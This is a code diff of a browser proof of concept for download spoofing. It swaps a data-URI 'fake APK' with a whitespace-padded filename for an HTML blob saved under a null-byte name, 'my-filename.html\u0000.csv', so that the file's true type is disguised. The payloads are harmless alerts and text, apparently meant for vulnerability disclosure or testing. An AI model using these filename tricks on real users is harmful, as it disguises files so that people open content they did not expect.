@@ -1,19 +1,32 @@
-<script language="javascript">
-function Puf(uri, name) {
-  var link = document.createElement("a");
-  link.download = name;
-  link.href = uri;
-  link.click();
-  
+<!doctype html>
+<html>
+<head>
+  <meta charset="utf-8">
+  <title>Download PoC</title>
+</head>
+<body>
+
+<button onclick="run()">Download file</button>
+
+<script>
+function run() {
+  const a = document.createElement('a');
+
+  const blob = new Blob(
+    ["<html><body><script>alert('hello')</script></body></html>"],
+    { type: "text/html" }
+  );
+
+  a.href = URL.createObjectURL(blob);
+  a.download = 'my-filename.html\u0000.csv'; // still using your null byte 😄
+
+  document.body.appendChild(a);
+  a.click();
+  document.body.removeChild(a);
+
+  URL.revokeObjectURL(a.href);
 }
-function openWin()
-{
-
-Puf("data:application/vnd.android.package-archive;base64,UGVhY2UgQmUgVXBvbiBZb3U=", "fakeapk.doc                                                            ['hacked link download  attacker.com.apk")
-
-}
-
 </script>
-<center><h2>Peace Be Upon You</h2></center>
 
-<input type="button"  onclick="openWin();" value="open"/>
+</body>
+</html>
